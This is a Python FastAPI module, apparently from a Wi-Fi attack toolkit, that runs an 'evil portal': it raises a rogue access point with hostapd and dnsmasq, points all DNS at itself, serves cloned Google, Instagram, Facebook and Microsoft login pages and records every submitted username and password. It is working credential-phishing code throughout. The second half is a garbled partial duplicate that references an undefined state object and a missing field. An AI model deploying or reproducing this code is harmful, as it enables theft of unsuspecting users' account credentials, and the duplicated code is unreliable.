import os
import json
import subprocess
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from pathlib import Path
from typing import Optional
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from core.database import db
from api.websocket import log_sync, broadcast_sync

router = APIRouter()

# Prefer source-relative path so templates work both in Docker (/app/backend/templates)
# and when running natively. Fall back to /app/templates (volume mount) if needed.
TEMPLATES_DIR = Path(__file__).parent.parent.parent / "templates"
if not TEMPLATES_DIR.exists():
    TEMPLATES_DIR = Path("/app/templates")

PORTAL_TEMPLATES = {
    "default":   "default_portal.html",
    "google":    "google_portal.html",
    "instagram": "instagram_portal.html",
    "facebook":  "facebook_portal.html",
    "microsoft": "microsoft_portal.html",
}

_state: dict = {
    "running": False,
    "ssid": None,
    "template": "default",
    "interface": None,
    "hostapd_proc": None,
    "dnsmasq_proc": None,
    "http_server": None,
}


class PortalRequest(BaseModel):
    ssid: str
    channel: int = 6
    interface: str
    password: Optional[str] = None
    template: str = "default"


class CredentialRequest(BaseModel):
    username: str
    password: str
    ip_address: Optional[str] = None


def _load_template(name: str) -> bytes:
    filename = PORTAL_TEMPLATES.get(name, "default_portal.html")
    path = TEMPLATES_DIR / filename
    if path.exists():
        return path.read_bytes()
    fallback = TEMPLATES_DIR / "default_portal.html"
    if fallback.exists():
        return fallback.read_bytes()
    return b"<html><body><h1>Login</h1></body></html>"


def _capture_cred(username: str, password: str, ip: str):
    try:
        db.add_credential("evil_portal", username, password, ip)
        log_sync(f"[EVIL PORTAL] {ip} — {username}:{password}", "warning", "evil_portal")
        broadcast_sync({
            "type": "credential_captured",
            "timestamp": datetime.now().isoformat(),
            "data": {"username": username, "password": password, "ip": ip},
        })
    except Exception:
        pass


def _make_handler(template_name: str):
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *a): pass

        def do_GET(self):
            body = _load_template(template_name)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length).decode("utf-8", errors="ignore")
            ip = self.client_address[0]
            username = password = ""
            ct = self.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in ct:
                params = parse_qs(raw)
                for k in ("username", "email", "loginfmt", "identifier", "login"):
                    if params.get(k):
                        username = params[k][0]; break
                for k in ("password", "passwd", "Passwd", "pass"):
                    if params.get(k):
                        password = params[k][0]; break
            elif "application/json" in ct:
                try:
                    d = json.loads(raw)
                    username = d.get("username") or d.get("email") or d.get("loginfmt") or ""
                    password = d.get("password") or d.get("passwd") or ""
                except Exception:
                    pass
            if username or password:
                _capture_cred(username, password, ip)
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
    return Handler


def _run_http_server(template: str, port: int = 80):
    Handler = _make_handler(template)
    try:
        server = HTTPServer(("0.0.0.0", port), Handler)
        _state["http_server"] = server
        server.serve_forever()
    except Exception as e:
        log_sync(f"Error servidor captivo: {e}", "error", "evil_portal")


@router.get("/templates")
async def list_templates():
    return [
        {"id": "default",   "name": "Genérico",   "desc": "Portal WiFi genérico"},
        {"id": "google",    "name": "Google",      "desc": "Clon de Google Login"},
        {"id": "instagram", "name": "Instagram",   "desc": "Clon de Instagram Login"},
        {"id": "facebook",  "name": "Facebook",    "desc": "Clon de Facebook Login"},
        {"id": "microsoft", "name": "Microsoft",   "desc": "Clon de Microsoft Login"},
    ]


@router.post("/start")
async def start_portal(req: PortalRequest):
    if _state["running"]:
        raise HTTPException(status_code=400, detail="El portal ya está en ejecución")

    hconf = (
        f"interface={req.interface}\ndriver=nl80211\nssid={req.ssid}\n"
        f"hw_mode=g\nchannel={req.channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n"
    )
    if req.password:
        hconf += f"wpa=2\nwpa_passphrase={req.password}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"
    with open("/tmp/wifipwn_hostapd.conf", "w") as f:
        f.write(hconf)

    dconf = (
        f"interface={req.interface}\n"
        "dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h\n"
        "dhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\n"
        "server=8.8.8.8\nlog-queries\nlog-dhcp\naddress=/#/192.168.1.1\n"
    )
    with open("/tmp/wifipwn_dnsmasq.conf", "w") as f:
        f.write(dconf)

    try:
        os.system(f"ip addr flush dev {req.interface} 2>/dev/null")
        os.system(f"ip addr add 192.168.1.1/24 dev {req.interface} 2>/dev/null")
        os.system(f"ip link set {req.interface} up")

        hp = subprocess.Popen(
            ["hostapd", "/tmp/wifipwn_hostapd.conf"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        dp = subprocess.Popen(
            ["dnsmasq", "-C", "/tmp/wifipwn_dnsmasq.conf", "--no-daemon"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        threading.Thread(target=_run_http_server, args=(req.template,), daemon=True).start()

        _state.update({
            "running": True, "ssid": req.ssid, "template": req.template,
            "interface": req.interface, "hostapd_proc": hp, "dnsmasq_proc": dp,
        })
        db.log_action("Evil Portal iniciado", f"SSID: {req.ssid} · Plantilla: {req.template}")
        log_sync(f"Evil Portal activo: {req.ssid} [{req.template}]", "success", "evil_portal")
        return {"success": True, "ssid": req.ssid}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/stop")
async def stop_portal():
    for k in ("hostapd_proc", "dnsmasq_proc"):
        p = _state.get(k)
        if p:
            try:
                p.terminate(); p.wait(timeout=3)
            except Exception:
                try: p.kill()
                except Exception: pass
            _state[k] = None
    srv = _state.get("http_server")
    if srv:
        try: srv.shutdown()
        except Exception: pass
        _state["http_server"] = None
    _state["running"] = False
    _state["ssid"] = None
    db.log_action("Evil Portal detenido")
    return {"success": True}


@router.get("/status")
async def portal_status():
    all_creds = db.get_credentials(10000)
    count = sum(1 for c in all_creds if c.get("source") == "evil_portal")
    return {
        "running": _state["running"],
        "ssid": _state["ssid"],
        "template": _state["template"],
        "credentials_count": count,
    }


@router.post("/credential")
async def add_credential(req: CredentialRequest):
    cid = db.add_credential("evil_portal", req.username, req.password, req.ip_address)
    log_sync(f"Credencial: {req.username}", "warning", "evil_portal")
    return {"id": cid}


@router.get("/credentials")
async def get_credentials():
    return db.get_credentials()



class CredentialRequest(BaseModel):
    username: str
    password: str
    ip_address: Optional[str] = None


@router.post("/start")
async def start_portal(req: PortalRequest):
    if _portalstate["running"]:
        raise HTTPException(status_code=400, detail="El portal ya está en ejecución")

    # Generar config hostapd
    hostapd_conf = f"""interface={req.interface}
driver=nl80211
ssid={req.essid}
hw_mode=g
channel={req.channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    if req.password:
        hostapd_conf += f"""wpa=2
wpa_passphrase={req.password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""

    conf_path = "/tmp/wifipwn_hostapd.conf"
    with open(conf_path, "w") as f:
        f.write(hostapd_conf)

    # Generar config dnsmasq
    dnsmasq_conf = f"""interface={req.interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/192.168.1.1
"""
    dnsmasq_path = "/tmp/wifipwn_dnsmasq.conf"
    with open(dnsmasq_path, "w") as f:
        f.write(dnsmasq_conf)

    try:
        # Configurar IP
        os.system(f"ip addr add 192.168.1.1/24 dev {req.interface} 2>/dev/null")
        os.system(f"ip link set {req.interface} up")

        hostapd_proc = subprocess.Popen(
            ["hostapd", conf_path],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", dnsmasq_path, "--no-daemon"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )

        _portalstate["running"]      = True
        _portalstate["essid"]        = req.essid
        _portalstate["hostapd_proc"] = hostapd_proc
        _portalstate["dnsmasq_proc"] = dnsmasq_proc

        db.log_action("Evil Portal iniciado", f"ESSID: {req.essid} Interfaz: {req.interface}")
        log_sync(f"Evil Portal activo: {req.essid}", "success", "evil_portal")
        return {"success": True, "essid": req.essid}

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/stop")
async def stop_portal():
    for key in ("hostapd_proc", "dnsmasq_proc"):
        proc = _portalstate.get(key)
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try: proc.kill()
                except Exception: pass
            _portalstate[key] = None

    _portalstate["running"] = False
    _portalstate["essid"]   = None
    db.log_action("Evil Portal detenido")
    return {"success": True}


@router.get("/status")
async def portal_status():
    return {
        "running": _portalstate["running"],
        "essid":   _portalstate["essid"],
    }


@router.post("/credential")
async def add_credential(req: CredentialRequest):
    cid = db.add_credential(
        source="evil_portal",
        username=req.username,
        password=req.password,
        ip_address=req.ip_address,
    )
    log_sync(f"Credencial capturada: {req.username}", "warning", "evil_portal")
    return {"id": cid}


@router.get("/credentials")
async def get_credentials():
    return db.get_credentials()
